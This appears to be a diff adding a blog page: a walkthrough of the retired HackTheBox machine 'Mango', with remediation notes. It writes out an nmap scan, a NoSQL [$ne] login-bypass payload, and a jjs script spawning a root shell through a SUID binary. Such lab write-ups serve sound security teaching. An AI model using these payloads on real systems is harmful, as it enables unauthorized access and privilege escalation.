@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Mango: NoSQL injection login bypass and a SUID jjs to root — Lucky Thandel</title>
+<meta name="description" content="Mongo-backed login falls to [$ne] injection, SSH as mango, then a SUID JavaScript engine (jjs) hands over root via GTFOBins. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-18 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Mango: NoSQL injection login bypass and a SUID jjs to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Mango is a retired HackTheBox easy Linux machine teaching NoSQL injection the way classic boxes taught SQLi. Synopsis: a Mongo-backed login falls to [$ne] injection, SSH as mango, then a SUID JavaScript engine (jjs) hands over root.</p>
+<h2><span class="amber">$</span> Enumeration — login backed by Mongo</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: find the login app</span>
+nmap -sC -sV -oN mango.nmap 10.10.10.162</pre>
+<p>HTTP with a login page backed by MongoDB, plus SSH. The form feeds a username and password straight into a Mongo query — no SQL in sight, same injection idea.</p>
+<h2><span class="amber">$</span> Foothold — NoSQL [$ne] bypass</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># http: operator injection at login</span>
+POST /login HTTP/1.1
+username[$ne]=x&amp;password[$ne]=x&amp;login=login
+# -&gt; logged in without a valid password; harvest the working pair, then:
+ssh mango@10.10.10.162</pre>
+<p>The [$ne] (not-equal) operator makes the query match an arbitrary user without a valid password. Iterate to a working session, harvest the credential pair from the authenticated area, SSH in as mango. Match the injection family to the database: [$ne], [$regex], [$gt] are the NoSQL alphabet.</p>
+<h2><span class="amber">$</span> Privilege escalation — SUID jjs</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: SUID sweep plus GTFOBins escape</span>
+find / -perm -4000 -type f 2&gt;/dev/null   # -&gt; /usr/lib/jvm/.../bin/jjs (SUID root)
+echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);
+var InputStreamReader = Java.type(&quot;java.io.InputStreamReader&quot;);
+var p = new java.lang.ProcessBuilder(&quot;/bin/sh&quot;).redirectErrorStream(true).start();
+var r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+var line; while ((line = r.readLine()) != null) { print(line); }' &gt; /tmp/r.js
+jjs /tmp/r.js   # root shell (see GTFOBins jjs)</pre>
+<p>The Java JavaScript engine installed SUID root executes scripts that can spawn processes — interpreters with SUID are root by delegation, same lesson as the perl sudo on Shocker. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>SQL payloads at a Mongo backend (wrong family) and skipping the SUID sweep (the manual find command is the whole privesc here).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Never build queries from raw input in any language, strip SUID from interpreters, and audit SUID binaries routinely. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
